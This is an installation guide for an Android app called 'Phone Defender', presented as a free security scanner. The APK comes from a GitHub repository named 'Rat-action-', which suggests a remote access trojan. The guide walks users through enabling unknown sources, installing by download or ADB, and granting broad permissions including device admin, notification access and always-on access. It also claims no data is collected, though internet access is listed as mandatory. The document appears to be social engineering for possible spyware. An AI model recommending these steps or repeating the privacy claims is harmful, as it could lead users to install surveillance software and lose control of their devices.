# 📱 Phone Defender - Installation & Setup Guide

## Prerequisites

### System Requirements
- **Android Version:** 7.0 (API 24) or higher
- **RAM:** Minimum 2GB (4GB+ recommended)
- **Storage:** At least 100MB free space
- **Device Admin:** Optional (for advanced features)

### Download Options

#### Option 1: From GitHub Releases (Recommended)
```bash
# Visit releases page
https://github.com/kiyyofficialid12/Rat-action-/releases

# Download latest APK
PhoneDefender-1.0.0.apk
```

#### Option 2: Build from Source
```bash
# Clone repository
git clone https://github.com/kiyyofficialid12/Rat-action-.git
cd Rat-action-

# Build APK
./gradlew assembleDebug

# Find APK at:
# app/build/outputs/apk/debug/app-debug.apk
```

---

## Installation Steps

### Method 1: Direct Download (Easy)

1. **Download APK**
   - Go to Releases page
   - Download `PhoneDefender-1.0.0.apk`

2. **Allow Unknown Sources** (if needed)
   - Settings → Security → Unknown Sources → Enable

3. **Install APK**
   - Open Downloads folder
   - Tap `PhoneDefender-1.0.0.apk`
   - Tap "Install"

4. **Launch App**
   - Tap "Open" or find in app drawer

### Method 2: ADB Installation (Advanced)

```bash
# Connect device via USB
# Enable USB debugging on device

# Install via ADB
adb install PhoneDefender-1.0.0.apk

# Verify installation
adb shell pm list packages | grep phonedefender

# Launch app
adb shell am start -n com.security.phonedefender/.MainActivity
```

### Method 3: Install from PC

1. **Connect Android Device**
   - Enable USB debugging
   - Connect via USB cable

2. **Copy APK to Device**
   ```bash
   adb push PhoneDefender-1.0.0.apk /sdcard/Download/
   ```

3. **Install on Device**
   - Open Files app
   - Navigate to Downloads
   - Tap APK file
   - Tap Install

---

## Initial Setup

### Step 1: Grant Permissions

When first launched, grant these permissions:

**Essential Permissions:**
- ✅ Internet access
- ✅ Network state
- ✅ File storage
- ✅ Package usage

**Advanced Permissions:**
- 🔲 Device admin (optional)
- 🔲 Notification access (optional)
- 🔲 Usage access (optional)

### Step 2: Configure Security Settings

1. **Open App**
2. **Go to Settings** (⚙️ icon)
3. **Configure:**
   - Auto-scan frequency
   - Notification alerts
   - Threat sensitivity
   - Backup location

### Step 3: Run Initial Scan

1. **Open "Security" Tab**
2. **Tap "Malware Scanner"**
3. **Tap "Start Scan"**
4. **Wait for completion**
5. **Review results**

---

## Feature Configuration

### 🔍 Malware Scanner

```
Settings → Scanner
├─ Scan frequency: Daily/Weekly/Manual
├─ Sensitivity: Low/Medium/High
├─ Auto-quarantine: On/Off
└─ Deep scan: On/Off
```

### 🌐 Network Monitor

```
Settings → Network
├─ Monitor status: On/Off
├─ Alert on suspicious: On/Off
├─ VPN detection: On/Off
└─ Port monitoring: On/Off
```

### 📊 App Tracker

```
Settings → Apps
├─ Permission tracking: On/Off
├─ Resource monitor: On/Off
├─ Startup manager: On/Off
└─ App notifications: On/Off
```

### 🔐 File Encryption

```
Settings → Encryption
├─ Algorithm: AES-256
├─ Auto-backup: On/Off
├─ Cloud backup: On/Off
└─ Encryption key storage: Secure
```

---

## Troubleshooting

### Installation Issues

**Problem: "Unknown app from an unknown source" error**
```
Solution:
1. Settings → Security
2. Enable "Unknown Sources"
3. Retry installation
```

**Problem: "Insufficient storage" error**
```
Solution:
1. Free up at least 100MB space
2. Clear app cache: Settings → Apps → Phone Defender → Storage → Clear Cache
3. Retry installation
```

**Problem: "Installation failed" error**
```
Solution:
1. Uninstall previous version
2. Restart device
3. Retry installation
```

### Runtime Issues

**Problem: App crashes on startup**
```
Solution:
1. Clear app data: Settings → Apps → Phone Defender → Storage → Clear Data
2. Restart device
3. Reinstall app
```

**Problem: Scanner not detecting threats**
```
Solution:
1. Grant all required permissions
2. Enable notification access: Settings → Notifications → Phone Defender → Allow
3. Manually start scan
```

**Problem: High battery/data usage**
```
Solution:
1. Reduce scan frequency
2. Disable real-time monitoring
3. Adjust threat sensitivity
```

### Permission Issues

**Problem: Some features are unavailable**
```
Solution:
1. Settings → Apps → Phone Defender → Permissions
2. Enable all required permissions
3. For Android 11+: Allow "All the time" access
```

---

## Uninstallation

### Remove App

**Method 1: Settings**
```
1. Settings → Apps
2. Find "Phone Defender"
3. Tap → Uninstall
4. Confirm
```

**Method 2: ADB**
```bash
adb uninstall com.security.phonedefender
```

**Method 3: File Manager**
```
1. Settings → Apps → Phone Defender
2. Storage → Clear Data & Cache
3. Uninstall
```

---

## FAQ

**Q: Is Phone Defender free?**
A: Yes, completely free and open-source.

**Q: Does it collect data?**
A: No, all scanning is done locally. No data is sent to servers.

**Q: Which permissions are mandatory?**
A: Internet and Network state. Others are optional for advanced features.

**Q: Can I uninstall and reinstall?**
A: Yes, app state is preserved in encrypted storage.

**Q: Is it compatible with other antivirus apps?**
A: Yes, Phone Defender works alongside other security apps.

---

**✅ Installation complete! Your phone is now protected. 🛡️**